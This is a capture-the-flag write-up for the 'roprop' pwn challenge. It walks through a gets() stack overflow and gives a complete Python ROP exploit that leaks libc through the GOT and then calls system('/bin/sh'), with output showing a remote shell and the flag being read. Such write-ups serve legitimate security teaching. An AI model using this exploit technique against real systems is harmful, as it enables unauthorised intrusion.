## Pwn/roprop
gr4n173

*This is from the back Solar Designer times where you require rope to climb and get anything you want.*

`nc pwn.darkarmy.xyz 5002`

File: `roprop`

## Solving
This challenge was done rapidly with [`pwnscripts`](https://github.com/152334H/pwnscripts).
```c
void timeout_kill(int a1) {
  if ( a1 == 14 ) {
    printf("Timeout occured. Exiting!");
    exit(0);
  }
}
unsigned int nvm_timeout() {
  signal(14, (__sighandler_t)timeout_kill);
  return alarm(0x3Cu);
}
int nvm_init() {
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  return setvbuf(stderr, 0LL, 2, 0LL);
}
int main() {
  char s[0x50]; // [rsp+0h] [rbp-50h]
  nvm_init();
  nvm_timeout();
  puts("Welcome to the Solar Designer World.\n");
  puts("He have got something for you since late 19's.\n");
  gets(s);
}
```
There is `gets()`. This means there's an overflow. 
```python
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
From `checksec`, PIE is disabled. This means that ROP can be abused with `puts()` on the GOT table to leak libc, and then to jump to a one-gadget.

Simple as pie.

```python
from pwnscripts import *
context.binary = 'roprop'
GOT_FUNCS = ['puts', 'gets']
DIST = 0x58

p = remote('pwn.darkarmy.xyz', 5002)

r = ROP(context.binary)
r.raw(DIST*b'a')
for s in GOT_FUNCS: r.puts(context.binary.got[s])
r.main()
p.sendlineafter("19's.\n\n", r.chain())

libc_leaks = dict((s,extract_first_bytes(p.recvline(),6)) for s in GOT_FUNCS)
context.libc_database = 'libc-database'
context.libc = context.libc_database.libc_find(libc_leaks)

r = ROP(context.binary)
r.raw(DIST*b'\0')
r.call(context.libc.symbols['system'], [context.libc.symbols['str_bin_sh']])
p.sendlineafter("19's.\n\n", r.chain())
p.interactive()
```
```bash
[+] Opening connection to pwn.darkarmy.xyz on port 5002: Done
[*] Loaded 14 cached gadgets for 'roprop'
[*] found libc! id: libc6_2.27-3ubuntu1.2_amd64
[*] Switching to interactive mode
$ ls
bin
dev
flag.txt
lib
lib32
lib64
roprop
$ cat flag.txt
darkCTF{y0u_r0p_r0p_4nd_w0n}
```
